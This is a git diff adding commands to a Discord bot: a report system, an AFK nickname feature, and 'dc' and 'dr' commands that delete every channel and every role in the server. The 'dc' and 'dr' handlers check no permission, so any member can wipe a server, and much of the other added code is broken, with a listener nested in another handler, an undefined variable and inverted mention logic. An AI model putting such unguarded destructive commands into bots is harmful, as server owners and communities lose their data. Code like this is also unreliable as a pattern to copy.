@@ -585,4 +585,110 @@ client.on('message', function(message) {
     }
 }); //Toxic Codes
 
+client.on('message', message => {
+           if (!message.channel.guild) return;
+ 
+    let room = message.content.split(" ").slice(1);
+    let findroom = message.guild.channels.find('name', `${room}`)
+    if(message.content.startsWith(prefix + "setReport")) {
+        if(!message.channel.guild) return message.reply('**This Command Only For Servers**');
+        if(!message.member.hasPermission('MANAGE_GUILD')) return message.channel.send('**Sorry But You Dont Have Permission** `MANAGE_GUILD`' );
+if(!room) return message.channel.send('Please Type The Channel Name')
+if(!findroom) return message.channel.send('Cant Find This Channel')
+let embed = new Discord.RichEmbed()
+.setTitle('**Done The report Code Has Been Setup**')
+.addField('Channel:', `${room}`)
+.addField('Requested By:', `${message.author}`)
+.setThumbnail(message.author.avatarURL)
+.setFooter(`${client.user.username}`)
+message.channel.sendEmbed(embed)
+reportjson[message.guild.id] = {
+channel: room,
+}
+fs.writeFile("./report.json", JSON.stringify(reportjson), (err) => {
+if (err) console.error(err)
+})
+client.on('message', message => {
+ 
+    if(message.content.startsWith(`${prefix}report`)) {
+        let  user  =  message.mentions.users.first();
+      if(!message.channel.guild) return message.reply('**This Command Only For Servers**');
+    let reason = message.content.split(" ").slice(2).join(" ");
+      if(!user)  return  message.channel.send("**You didn\'t mention the user to report**")
+      if(!reason) return message.reply(`**Please provide a reason**`)
+    let findchannel = (message.guild.channels.find('name', `${reportjson[message.guild.id].channel}`))
+    if(!findchannel) return message.reply(`Error 404: The report Channel Cant Find Or Not Set To Set The report Channel Type: ${prefix}setReport`)
+    message.channel.send(`Done Thank You For Your Report Will Be Seen By The Staffs`)
+    let sugembed = new Discord.RichEmbed()
+    .setTitle('New Report !')
+    .addField('Report By:', `${message.author}`)
+    .addField('Reported User:', `${user}`)
+    .addField('Report Reason:', `${reason}`)
+    .setFooter(client.user.username)
+    findchannel.sendEmbed(sugembed)
+        .then(function (message) {
+          message.react('✅')
+          message.react('❌')
+        })
+        .catch(err => {
+            message.reply(`Error 404: The report Channel Cant Find Or Not Set To Set The report Channel Type: ${prefix}setReport`)
+            console.error(err);
+        });
+        }
+      }
+)}
+})
+
+client.on('message',async rebel => {
+      if(rebel.author.bot) return;
+  if (afk[rebel.author.id]) {
+    delete afk[rebel.author.id];
+    if (rebel.member.nickname === null) {
+      msg.channel.send("**Welcome , <@"+rebel.author.id+"> I am trying to remove the afk from you.**");     } else {
+      rebel.member.setNickname(rebel.member.nickname.replace(/(\[AFK\])/,''));
+      rebel.channel.send("**Welcome , <@"+rebel.author.id+"> The afk was removed from you because you come back.**"); 
+    }
+    fs.writeFile("./afk.json", JSON.stringify(afk), (err) => {if (err) console.error(err);});
+} else {
+    if (rebel.content.startsWith(prefix + 'afk ')||rebel.content === prefix + 'afk') {
+      rebel.member.setNickname("[AFK] " + rebel.member.displayName);
+      let args1 = rebel.content.split(' ').slice(1);
+      if (args1.length === 0) {
+        afk[rebel.author.id] = {"reason": true}; 
+        rebel.reply("** I put you in a afk position **")
+      } else {
+        afk[rebel.author.id] = {"reason": args1.join(" ")}; // with reason
+        rebel.reply("**I added you to your afk because** "+ args1.join(" ") + ".")
+      }
+      fs.writeFile("./afk.json", JSON.stringify(afk), (err) => {if (err) console.error(err);});   
+  }
+}
+         var mentionned = rebel.mentions.users.first();
+if(rebel.mentions.users.size > 0) return ;
+if (afk[rebel.mentions.users.first().id]) {
+if (afk[rebel.mentions.users.first().id].reason === true) {
+rebel.channel.send(`**<@!${mentionned.id}> Afk** `);
+}else{
+rebel.channel.send(`**<@!${mentionned.username}> is Afk , Afk reason \n ${afk[rebel.mentions.users.first().id].reason}**`);
+}
+} 
+});
+
+client.on('message', message => {
+ if(message.content.split(' ')[0] == prefix + 'dc') { 
+ if (!message.channel.guild) return;
+ message.guild.channels.forEach(m => {
+ m.delete();
+ message.reply("`All channels successfully deleted!`")
+ });
+ }
+ if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
+ if (!message.channel.guild) return;
+ message.guild.roles.forEach(m => {
+ m.delete();
+ });
+ message.reply("`All ranks successfully deleted!`")
+ }
+ });
+
 client.login(process.env.BOT_TOKEN);//MrBloods bot
